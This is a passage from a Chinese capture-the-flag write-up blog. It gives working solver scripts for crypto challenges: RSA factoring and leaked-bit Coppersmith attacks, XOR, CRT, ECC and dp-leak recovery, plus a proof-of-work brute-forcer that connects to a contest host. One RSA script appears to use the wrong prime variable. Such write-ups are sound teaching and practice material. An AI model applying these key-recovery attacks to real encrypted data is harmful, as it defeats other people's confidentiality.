class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span>,</span><br><span class="line">    <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>))):</span><br><span class="line"></span><br><span class="line">    kp = gcd(a1 * hints[<span class="number">0</span>] - a2 * hints[<span class="number">1</span>], n2)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kp &lt; n2:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;find!&quot;</span>, kp, a1, a2</span><br><span class="line">        )  <span class="comment"># find! 178557871889789476735392773689039729944728430625818764599203953284194468360955366524476361619864195810267037397001299832526726480560276846147351034417947012223276604383027178163281207815083989579760615671067777036793963045167137767877397560786425871554804100602428308050015870442290953340882348809647523234561 8161 4513</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">        kp //= i</span><br><span class="line"></span><br><span class="line">p = kp</span><br><span class="line">q2 = n2 // p</span><br><span class="line"><span class="keyword">assert</span> p * q2 == n2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line">flag = long_to_bytes(m).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a>X0R</h2><p>问gpt的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">flag_prefix = <span class="string">b&quot;SYC&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1: 将e2转换回e1</span></span><br><span class="line">e1 = e2 ^ f2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2: 将e1转换回enc</span></span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3: 将enc转换为bytes</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4: 推测key的前四个字节</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(flag_prefix, enc_bytes[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤5: 使用推测的key解出flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(</span><br><span class="line">    a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(enc_bytes, key_bytes * (<span class="built_in">len</span>(enc_bytes) // <span class="built_in">len</span>(key_bytes)))</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h2><p>gpt*2</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 p 和 c 数组</span></span><br><span class="line">p = [</span><br><span class="line">    <span class="number">1921232050179818686537976490035</span>,</span><br><span class="line">    <span class="number">2050175089402111328155892746480</span>,</span><br><span class="line">    <span class="number">1960810970476421389691930930824</span>,</span><br><span class="line">    <span class="number">1797713136323968089432024221276</span>,</span><br><span class="line">    <span class="number">2326915607951286191807212748022</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1259284928311091851012441581576</span>,</span><br><span class="line">    <span class="number">1501691203352712190922548476321</span>,</span><br><span class="line">    <span class="number">1660842626322200346728249202857</span>,</span><br><span class="line">    <span class="number">657314037433265072289232145909</span>,</span><br><span class="line">    <span class="number">2056630082529583499248887436721</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过中国剩余定理求解 m</span></span><br><span class="line">m, _ = crt(p, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换回字节</span></span><br><span class="line">m_bytes = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉最后 23 个字节</span></span><br><span class="line">flag = m_bytes[:-<span class="number">23</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>经典的m高位泄露，套脚本</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">high_m=(h+<span class="number">2023</span>)//<span class="number">2024</span></span><br><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c =<span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line"></span><br><span class="line">phase2(high_m, n, c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h2><p><img src="/img/WP/geek2024/caesar.png"></p><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>gpt*3</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Server details</span></span><br><span class="line">HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span>  <span class="comment"># Replace with the server&#x27;s IP address</span></span><br><span class="line">PORT = <span class="number">17384</span>  <span class="comment"># Replace with the server&#x27;s port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_proof_of_work</span>(<span class="params">suffix, hexdigest</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve the Proof of Work challenge by brute-forcing the first 4 characters.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(suffix, hexdigest)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> (</span><br><span class="line">        <span class="string">&quot;&quot;</span>.join(c)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>)</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((x + suffix).encode()).hexdigest() == hexdigest:</span><br><span class="line">            <span class="keyword">return</span> x.encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Connect to the server, solve the Proof of Work, and retrieve the flag.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read Proof of Work challenge</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the PoW challenge</span></span><br><span class="line">        <span class="comment"># Example: &quot;[+] sha256(XXXX+abcdef) == deadbeef...&quot;</span></span><br><span class="line">        _, rest = data.split(<span class="string">&quot;sha256(XXXX+&quot;</span>)</span><br><span class="line">        proof, hexdigest = rest.split(<span class="string">&quot;) == &quot;</span>)</span><br><span class="line">        hexdigest = hexdigest.strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Solve the PoW</span></span><br><span class="line">        prefix = solve_proof_of_work(proof.strip(), hexdigest)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> prefix:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to solve Proof of Work&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send the PoW solution</span></span><br><span class="line">        s.sendall(prefix + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read the server&#x27;s response</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;PoW failed.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="comment"># Retrieve the flag characters</span></span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):  <span class="comment"># Assuming the flag length is 32</span></span><br><span class="line">            s.sendall(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">            response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;[+]&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">                flag += response.split(<span class="string">&quot;[+] &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid response:&quot;</span>, response)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Print the complete flag</span></span><br><span class="line">        flag = flag.replace(<span class="string">&quot;[-] &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><h2 id="highlow"><a href="#highlow" class="headerlink" title="highlow"></a>highlow</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://life-extension.github.io/2020/03/29/Coppersmith%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/">https://life-extension.github.io/2020/03/29/Coppersmith%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/</a><br>转成p已知高位和低位的攻击</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;z&#x27;</span>*<span class="number">44</span></span><br><span class="line">f = <span class="built_in">hex</span>(bytes_to_long(flag.encode()))</span><br><span class="line">pxor = <span class="number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span></span><br><span class="line"><span class="built_in">print</span>(f,<span class="built_in">len</span>(<span class="built_in">str</span>(f[<span class="number">2</span>:])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pxor),<span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(pxor))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high = &#x27;</span>,<span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low = &#x27;</span>, <span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>))</span><br></pre></td></tr></table></figure><pre><code>high =  0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
low =  0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27
</code></pre><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line">size = <span class="number">2048</span></span><br><span class="line">sizep= <span class="number">1024</span></span><br><span class="line">knownbits= <span class="number">134</span>*<span class="number">4</span></span><br><span class="line">N = <span class="number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#we need to define an polynomial == 0 (mod p) that gives us the missing part (x)</span></span><br><span class="line"><span class="comment"># f_p(x) = x*2**(knownbits/2) + p_msb + p_lsb</span></span><br><span class="line"><span class="comment"># it&#x27;s not monic so we need to divide by 2**(knownbits/2)</span></span><br><span class="line"><span class="comment"># set R = 2**(knownbits/2) and invert it modulo N</span></span><br><span class="line"></span><br><span class="line">R = <span class="number">2</span>**(knownbits//<span class="number">2</span>)<span class="comment">#从第68位开始测试</span></span><br><span class="line">invR = inverse_mod(R,N)</span><br><span class="line"><span class="comment">#补齐两边</span></span><br><span class="line">p_msb = <span class="number">0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">p_lsb = <span class="number">0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br><span class="line"><span class="comment">#setup coppersmith</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line"><span class="comment">#define the poly in x modulo p</span></span><br><span class="line">f = x + (p_msb+p_lsb)*invR</span><br><span class="line"><span class="comment">#solve it</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^(sizep-knownbits)-<span class="number">1</span>, beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">64</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;reconstructed p: &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(Integer(x0*R)+p_msb+p_lsb))</span><br><span class="line"><span class="comment"># reconstructed p: b0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3eaa21526dceb4b5a0150fccdddbc5e88b624e41e9270428bf188d2526ccadabff88ea107fcb6952e937b0d315d0496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br></pre></td></tr></table></figure><h2 id="RnoCRT"><a href="#RnoCRT" class="headerlink" title="RnoCRT"></a>RnoCRT</h2><p>风二西题库又秒了<br>[V&amp;N2020 公开赛]CRT(中国剩余定理模数不互质)<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/weixin_44110537/article/details/107396080">https://blog.csdn.net/weixin_44110537/article/details/107396080</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">a1, n1, a2, n2</span>):</span><br><span class="line">    d = math.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    <span class="keyword">if</span> c % d != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">a, n</span>):</span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod = n1</span><br><span class="line">    <span class="keyword">return</span> (a1 % n1 + n1) % n1</span><br><span class="line"></span><br><span class="line">ms = [</span><br><span class="line">    <span class="number">207867980504656835313307696396607264603</span>,</span><br><span class="line">    <span class="number">245036212212570610987366430554968489325</span>,</span><br><span class="line">    <span class="number">270836744824069537438646110613439698666</span>,</span><br><span class="line">    <span class="number">319275775495422875474878625752594133023</span>,</span><br><span class="line">    <span class="number">254268823435329877199449670714528712873</span>,</span><br><span class="line">    <span class="number">213093607196415232366564484229844568444</span>,</span><br><span class="line">    <span class="number">246921085368773491003187313772615702950</span>,</span><br><span class="line">]</span><br><span class="line">cs = [</span><br><span class="line">    <span class="number">150031581047390726903711035932621949276</span>,</span><br><span class="line">    <span class="number">21260202376534810598778595491323328519</span>,</span><br><span class="line">    <span class="number">144049733622518360270048059408969512643</span>,</span><br><span class="line">    <span class="number">236920143187836025924037873968303507493</span>,</span><br><span class="line">    <span class="number">99781504248790469459151935530031893836</span>,</span><br><span class="line">    <span class="number">69236016568483424294966410179787943383</span>,</span><br><span class="line">    <span class="number">20613188366058016717435734248097940419</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">x = exCRT(cs, ms)</span><br><span class="line">flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;6a651&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">    x = x + mod</span><br><span class="line">    <span class="comment"># print(x)</span></span><br><span class="line">    flag = hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(type(flag))</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://dexterjie.github.io/2023/07/25/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/ECC/">https://dexterjie.github.io/2023/07/25/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/ECC/</a></p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span> , <span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>])</span><br><span class="line">c2 = E([<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span> , <span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>])</span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = c1 - k * c2</span><br><span class="line"></span><br><span class="line">flag1 = cipher_left//m[<span class="number">0</span>]</span><br><span class="line">flag2 = cipher_right//m[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag1,flag2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag1))+long_to_bytes(<span class="built_in">int</span>(flag2)))</span><br></pre></td></tr></table></figure><h2 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65537</span>):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者:</span> <span class="post-copyright-info"><a href="https://blog.hatchet.top">hatchet</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接:</span> <span class="post-copyright-info"><a href="https://blog.hatchet.top/posts/c264f0a9.html">https://blog.hatchet.top/posts/c264f0a9.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="external nofollow noopener noreferrer">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.hatchet.top" target="_blank">hatchet的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/crypto/">crypto</a></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/fc0a87bd.html" title="Python中werkzeug有关PIN值的构造"><div class="cover" style="background:var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Python中werkzeug有关PIN值的构造</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/44659fec.html" title="PHP特性"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-25</div><div class="title">PHP特性</div></div></a></div><div><a href="/posts/26728343.html" title="各种RCE绕过"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-20</div><div class="title">各种RCE绕过</div></div></a></div><div><a href="/posts/e93ac459.html" title="XXE"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-18</div><div class="title">XXE</div></div></a></div><div><a href="/posts/89707270.html" title="[奇安信]Web-4-littledropbox"><div class="cover" style="background:var(--default-bg-color)"></div><div class="content 